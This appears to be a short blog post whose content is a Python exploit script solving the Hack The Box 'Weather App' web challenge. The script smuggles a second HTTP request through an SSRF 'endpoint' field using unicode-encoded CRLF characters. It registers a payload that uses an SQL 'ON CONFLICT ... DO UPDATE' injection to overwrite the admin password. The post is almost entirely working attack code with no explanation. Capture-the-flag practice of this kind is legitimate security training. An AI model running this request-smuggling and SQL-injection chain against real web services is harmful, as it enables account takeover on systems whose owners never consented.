---
layout: single
title: Weather App [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - HTTP request smuggling
  - SQL injection CONFLICT
---

Exploit:
```python
import requests


url = "http://178.62.123.156:32748"

username = 'admin'
password = "1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"
parseUsername = username.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
parsePassword = password.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parseUsername) + len(parsePassword) + 19
endpoint =  '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(contentLength) + '\u010D\u010A\u010D\u010Ausername=' + parseUsername + '&password=' + parsePassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol='
r = requests.post(url + '/api/weather', json={'endpoint': endpoint, 'city': 'chengdu', 'country': 'CN'})
print(r)
```
